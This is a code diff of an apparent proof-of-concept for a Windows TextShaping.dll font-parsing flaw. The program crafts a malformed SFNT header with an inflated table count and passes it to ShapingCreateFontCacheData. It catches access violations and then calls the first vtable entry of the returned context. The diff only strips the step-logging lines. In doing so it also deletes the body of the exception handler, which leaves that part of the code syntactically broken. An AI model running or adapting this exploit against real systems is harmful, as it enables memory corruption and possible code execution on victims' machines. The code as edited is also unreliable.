@@ -210,7 +210,7 @@ int main(void) {
     }
     LOGSUCCESS("Loaded TextShaping.dll at base address %p", (void*)hTextShaping);
 
-    LOGSTEP("Step 2: Locating ShapingCreateFontCacheData via GetProcAddress");
+    
     typedef HRESULT (WINAPI *PFN_SCFCD)(
         void**, const void*, UINT32, const void*, UINT32, UINT32
     );
@@ -230,7 +230,7 @@ int main(void) {
     HRESULT hr   = E_FAIL;
 
    
-    LOGSTEP("Step 3: Crafting in-memory SFNT header");
+    
     uint32_t sfntVersion = 0x00010000;    // TTF version tag
     uint16_t numTables   = 0x5000;        // bumped for testing
     uint16_t pow2 = 1, entrySelector = 0;
@@ -242,7 +242,7 @@ int main(void) {
     uint16_t searchRange    = (uint16_t)rawSearchRange;
     uint16_t rangeShift     = (uint16_t)rawRangeShift;
 
-    LOGSTEP("Chosen SFNT fields:");
+    
     LOGSUCCESS("  sfntVersion    = 0x%08X", sfntVersion);
     LOGSUCCESS("  numTables      = 0x%04X", numTables);
     LOGSUCCESS("  searchRange    = 0x%04X", searchRange);
@@ -335,13 +335,7 @@ int main(void) {
         LOGFAIL("Failed to open %s (errno %d)", dumpPath, errno);
     }
 
-    LOGSTEP(
-        "Summary: ver=0x%08X num=0x%04X sr=0x%04X es=0x%04X rs=0x%04X "
-        "size=%zu ptr=%p file=%s",
-        sfntVersion, numTables, searchRange,
-        entrySelector, rangeShift,
-        totalSize, (void*)buf, dumpPath
-    );
+
 
     
     #define DESIRED_OFFSET 0x12FE0
@@ -386,14 +380,12 @@ int main(void) {
     __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION
               ? EXCEPTION_EXECUTE_HANDLER
               : EXCEPTION_CONTINUE_SEARCH)
-    {
-        LOGSTEP("Caught AV inside ShapingCreateFontCacheData, continuing");
-    }
+  
     if (hr == S_OK && pCtx) {
         LOGSUCCESS("SCFCD returned context %p", pCtx);
         typedef void (__stdcall *PFN_CTX_METHOD)(void *);
         PFN_CTX_METHOD m0 = ((PFN_CTX_METHOD*)((void**)pCtx)[0])[0];
-        LOGSTEP("Invoking vtable[0] @ %p …", m0);
+      
         m0(pCtx);
 
         free(buf);
@@ -405,7 +397,7 @@ int main(void) {
         }
     }
 
-    LOGSTEP("Unloading TextShaping.dll");
+   
     FreeLibrary(hTextShaping);
     return 0;
 }
